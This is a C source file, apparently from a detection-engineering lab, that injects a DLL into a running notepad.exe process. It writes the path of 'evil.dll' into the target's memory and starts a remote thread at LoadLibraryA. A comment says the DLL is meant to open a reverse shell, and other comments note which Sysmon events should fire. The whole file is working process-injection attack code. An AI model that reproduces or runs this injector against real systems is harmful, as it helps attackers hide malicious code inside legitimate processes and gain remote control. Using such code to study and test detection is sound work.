// Create rev shell in evil.dll
#include "common.h"

int main() {
    // Path to malicious DLL on target system
    const char* dllPath = "C:\\Temp\\evil.dll";
    SIZE_T dllPathLen = strlen(dllPath) + 1;

    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Minimum rights for DLL injection
    // No PROCESS_CREATE_THREAD needed if using LoadLibrary trick
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE         |
        PROCESS_VM_OPERATION     |
        PROCESS_CREATE_THREAD    |
        PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE, pid
    );
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired — requested 0x143a\n");

    // Allocate memory for DLL path string in remote process
    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, dllPathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE          // RW only — path string not shellcode
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    // Write DLL path string into remote process
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, dllPath, dllPathLen, &written)) {
        wprintf(L"[-] WriteProcessMemory failed\n");
        return 1;
    }
    wprintf(L"[+] DLL path written: %zu bytes\n", written);

    // Get address of LoadLibraryA in kernel32.dll
    // Same address in all processes due to ASLR shared mapping
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
    );
    if (!loadLibAddr) {
        wprintf(L"[-] Failed to get LoadLibraryA address\n");
        return 1;
    }
    wprintf(L"[+] LoadLibraryA at: 0x%p\n", loadLibAddr);

    // Create remote thread starting at LoadLibraryA
    // with DLL path as argument
    // EID 8 fires — but StartModule shows kernel32.dll not -
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr,
        remoteMem,              // argument = DLL path string
        0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");
    wprintf(L"[*] EID 8 StartModule should show kernel32.dll not -\n");
    wprintf(L"[*] EID 7 should fire when DLL loads into notepad\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
